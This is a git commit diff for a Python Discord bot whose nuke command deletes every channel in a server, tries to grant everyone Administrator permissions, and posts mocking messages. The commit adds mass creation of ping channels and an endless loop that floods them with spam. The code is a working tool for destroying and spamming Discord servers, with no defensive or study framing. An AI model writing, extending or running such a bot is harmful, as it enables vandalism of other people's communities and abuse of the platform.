4448b378e413a87d6c58033ba34cb236999fb629
Joee <111636011+consolelogHelloWorld@users.noreply.github.com>
2022-08-22 23:31:32 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-import discord, json
+import discord, json, random
 from discord import Permissions
 from discord.ext import commands
 from datetime import datetime as local_time
@@ -10,6 +10,7 @@ with open('config.json', 'r') as config:
     token = config['bot_token']
     prefix = config['bot_prefix']
     reason = config['reasoning']
+    loop_times = int(config['loops'])
     server_nuked_name = config['server_nuked_name']
     nuked_channels = config['nuked_channel_names']
     messages = config['spam_messages']
@@ -41,23 +42,34 @@ async def nuke(ctx):
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="a server get nuked."))
 
 
-    #Deletes all channels and categories
+    # Deletes all channels and categories
     for item in ctx.guild.channels:
         await item.delete()
 
 
+    # Creates Nuking, and Pings categories
+    await ctx.guild.create_category('NUKING')
+    await ctx.guild.create_category('PINGS')
+    nuking_category = discord.utils.get(ctx.guild.channels, name='NUKING')
+    pings_category = discord.utils.get(ctx.guild.channels, name='PINGS')
+
+
     # Create nuking changelog channel, and reasoning channel. Then gets the id's of said channels.
     perms_overwrite = {discord.utils.get(ctx.guild.roles, name='@everyone'): discord.PermissionOverwrite(view_channel = True, send_messages = False)}
-    await ctx.message.guild.create_text_channel('nuking-changelog', overwrites = perms_overwrite)
-    await ctx.message.guild.create_text_channel('nuking-reason', overwrites = perms_overwrite)
-    await ctx.message.guild.create_text_channel('complaining')
-    reason_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-reason')
+    
+    await ctx.message.guild.create_text_channel(name = 'nuking-changelog', category = nuking_category, overwrites = perms_overwrite)
     changelog_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-changelog')
+
+    await ctx.message.guild.create_text_channel(name = 'nuking-reason', category = nuking_category, overwrites = perms_overwrite)
+    reason_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-reason')
+
+    await ctx.message.guild.create_text_channel('complaining')
     complaining_channel = discord.utils.get(ctx.guild.channels, name = 'complaining')
 
     embed = discord.Embed(title = 'All channels deleted.', description = f'Say good-bye to your old channels, the new #general is <#{complaining_channel.id}>', color = discord.Color.from_rgb(157, 51, 255))
     embed.timestamp = local_time.now()
     await changelog_channel.send(embed = embed)
+
 
     # Gives everyone admin permissions
     try:
@@ -66,14 +78,25 @@ async def nuke(ctx):
         await discord.utils.get(ctx.guild.roles, name='@everyone').edit(permissions = administrator_perms)
 
     except Exception:
-        embed = discord.Embed(title = 'Error: Unable to give @everyone `Administrator` permissions.', description = 'Sorry, something went wrong meaning I can\'t let you ruin the server yourself.', color = discord.Color.from_rgb(157, 51, 255))
+        embed = discord.Embed(title = 'Error: Unable to give everyone `Administrator` permissions.', description = 'Sorry, something went wrong meaning I can\'t let you ruin the server yourself.', color = discord.Color.from_rgb(157, 51, 255))
         embed.timestamp = local_time.now()
         await changelog_channel.send(embed = embed)
 
     else:
-        embed = discord.Embed(title = '@everyone now has `Administrator` permissions', description = 'Enjoy ruining the server yourself!', color = discord.Color.from_rgb(157, 51, 255))
+        embed = discord.Embed(title = 'Everyone now has `Administrator` permissions', description = 'Enjoy ruining the server yourself!', color = discord.Color.from_rgb(157, 51, 255))
         embed.timestamp = local_time.now()
         await changelog_channel.send(embed = embed)
+
+
+    # Creates ping channels
+    for x in range(0, loop_times):
+            for channel in nuked_channels:
+                await ctx.guild.create_text_channel(name = f'{x}-{channel}', category = pings_category)
+    
+    while True:
+        for channel in pings_category.channels:
+            await channel.send(f'||`{random.randint(0, 9999)}`|| : **{random.choice(messages)}**')
+
 
 # Stop Command
 @bot.command()
